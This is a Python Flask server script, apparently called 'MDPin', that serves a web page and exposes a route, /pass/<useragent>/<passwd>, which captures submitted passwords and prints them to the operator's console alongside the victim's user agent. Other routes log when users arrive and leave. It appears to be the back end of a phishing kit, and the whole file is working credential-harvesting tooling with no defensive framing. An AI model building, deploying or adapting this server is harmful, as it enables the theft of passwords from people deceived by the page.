class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKCYAN = '\033[96m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

import re, os, json, threading, time, socket, sys, subprocess, sys, logging
from json import dumps

directories=['static',str(os.path.join('py','static')),str(os.path.join('..','static')),str(os.path.join('..','..','static'))]

static_dir = '../static'
if os.name == "nt":
	for i in directories:
		if os.path.isdir(i):
			static_dir = i
print(f'Chosen Static Directory is {static_dir}')

def install(package,exiting=True):
	answer = ''
	while answer not in ("y","n"):
		print()
		answer = input(f"Do you want to install {package}? [Y/N] ").lower()
	if answer == 'y':
		try:
			print()
			subprocess.check_call([sys.executable, "-m", "pip", "install", package])
		except:
			print(f"Installation failed for {package}")
	else:
		print("Aborting...")
	if exiting:
		exit(0)


try:
	import colorama
except:
	print("Colorama Isn't Installed. Run: pip install colorama or pip3 install colorama")
	install("colorama")

from colorama import init
from colorama import Fore, Back, Style
init()

try:
	from flask import Flask, request
except:
	print("\033[91mFlask Isn't Installed.\033[0m Run:",f"{Style.BRIGHT}pip install Flask{Style.RESET_ALL} or {Style.BRIGHT}pip3 install Flask{Style.RESET_ALL}")
	install("Flask")



try:
	from flask_restful import Resource, Api
except:
	try:
		from Flask_RESTful import Resource, Api
	except:
		print("\033[91mFlask_RESTful Isn't Installed.\033[0m Run:",f"{Style.BRIGHT}pip install Flask_RESTful{Style.RESET_ALL} or {Style.BRIGHT}pip3 install Flask_RESTful{Style.RESET_ALL}")
		install("Flask_RESTful")





try:
	from flask_jsonpify import jsonify
except:
	print("\033[91mFlask-Jsonpify Isn't Installed.\033[0m Run:",f"{Style.BRIGHT}pip install Flask_Jsonpify{Style.RESET_ALL} or {Style.BRIGHT}pip3 install Flask_Jsonpify{Style.RESET_ALL}")
	install("flask_jsonpify")



try:
	from OpenSSL import SSL
except:
	print("\033[91mpyOpenSSL Isn't Installed.\033[0m Run:",f"{Style.BRIGHT}pip install pyOpenSSL{Style.RESET_ALL} or {Style.BRIGHT}pip3 install pyOpenSSL{Style.RESET_ALL}")
	print("dependency setuptools-rust is also needed to be installed")
	install("setuptools-rust",exiting=False)
	install("pyOpenSSL",exiting=True)



def get_ip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		# doesn't even have to be reachable
		s.connect(('10.255.255.255', 1))
		IP = s.getsockname()[0]
	except Exception:
		IP = '127.0.0.1'
	finally:
		s.close()
	return IP


def gen_config(port):
	answer = input("Do you want to use a generated config file for the static directory? [Y/N] ")
	directories=['static',str(os.path.join('py','static')),str(os.path.join('..','static')),str(os.path.join('..','..','static'))]
	for i in directories:
		if os.path.isdir(i):
			directory = i
	filepath = os.path.join(directory,"config.json")
	#print(filepath)
	with open(filepath, "w") as f:
		newline = "\n"
		openbrace = "{"
		closebrace = "}"
		if (answer.lower() == "y"):
			if port == 8075:
				proto = "http://"
			if port == 8070:
				proto = "https://"
			f.write(f'{openbrace}{newline}    "address": "{str(get_ip())}",{newline}    "port": "{port}",{newline}    "protocol": "{proto}"{newline}{closebrace}')
		else:
			f.write(f'{openbrace}{newline}    "address": "localhost",{newline}    "port": "8075",{newline}    "protocol": "http://"{newline}{closebrace}')
	#with open(filepath)
	#exit(0)
	#print("done")
	#activate_job()


def welcome():
	time.sleep(5)
	global port
	gen_config(port=port)
	if (port == 8070):
		proto = "HTTPS"
	elif (port == 8075):
		proto = "HTTP"
	else:
		proto = "Unknown Protocol"
	print("""\n\033[91m
*     *  *****    ****                  
**   **   *   *   *   *    *            
* * * *   *   *   *   *                 
*  *  *   *   *   *   *   **    * ***   
*     *   *   *   ****     *    **   *  
*     *   *   *   *        *    *    *  
*     *   *   *   *        *    *    *  
*     *   *   *   *        *    *    *  
*     *  *****    *      *****  *    *  
\033[0m""")
	ip = get_ip()
	website = proto.lower()+"://"+ip+":"+str(port)+"/web/index.html"
	print("Server running on", f"{bcolors.FAIL}{ip}:{port}{bcolors.ENDC} with {bcolors.FAIL}{proto}{bcolors.ENDC}")
	print(f"Server Address: {bcolors.FAIL}{ip}{bcolors.ENDC}, port:{bcolors.FAIL}{port}{bcolors.ENDC}, protocol:{bcolors.FAIL}{proto}://{bcolors.ENDC}")
	print(f"Website Reachable on {bcolors.FAIL}{website}{bcolors.ENDC}")
	print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","Waiting for a Connection...")
	print("\n")


cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__,static_url_path='/web',static_folder=static_dir,template_folder='../static/templates')
api = Api(app)

def activate_job():
	download_thread = threading.Thread(target=welcome, name="welcomer")
	download_thread.start()

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class newpass(Resource):
	def get(self, passwd, useragent):
		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","NEW PASSWORD:","\033[1m\033[4m\033[91m",passwd,"\033[0m","FROM:\033[1m\033[4m\033[91m",useragent,"\033[0m")
		return

class newuser(Resource):
	def get(self, useragent):
		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","NEW USER:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
		return

class left(Resource):
	def get(self, useragent):
		print("\033[1m\033[92m[festus8070@Unknown\033[0m \033[1m\033[91mMDPin\033[0m\033[1m\033[92m]$\033[0m","USER HAS LEFT:","\033[1m\033[4m\033[91m",useragent,"\033[0m")
		return		


#class getstatic(Resource):
#		def send_js(self, path):
#				return send_from_directory('../static', path)

#api.add_resource(getstatic, '/web/<path>') # Route_1
api.add_resource(left, '/left/<useragent>') # Route_1
api.add_resource(newuser, '/new/<useragent>') # Route_2
api.add_resource(newpass, '/pass/<useragent>/<passwd>') # Route_3


if __name__ == '__main__':
	activate_job()
	#welcome()
	skiphttps=False
	try:
		with open('config.json') as json_file:
			data = json.load(json_file)
			_key = data["key"]
			_crt = data["crt"]
			print("Using:\n",_crt,"\n",_key,"\n")
			context = (_crt,_key)
	except:
		print('Config.json was not found in current directory. Skipping HTTPS.')
		_key = './none.key'
		_crt = './none.crt'
		skiphttps=True
		context = (_crt,_key)


	try:
		if skiphttps:
			raise Exception('Skipped Https')
		port = 8070
		app.run(ssl_context=context,port='8070',host='0.0.0.0')
	except Exception as ex:
		#print("Exception")
		try:
			#func = request.environ.get('werkzeug.server.shutdown')
			#func()
			pass
		except Exception as ee:
			print(ee)
		template = "An exception of type {0} occurred. Arguments:\n{1!r}"
		message = template.format(type(ex).__name__, ex.args)
		#print(message)
		if skiphttps:
			print("\nCertificate files were not found! It's okay. MDPin's falling back to plain HTTP.")
		port = 8075
		app.run(port='8075',host='0.0.0.0')

		
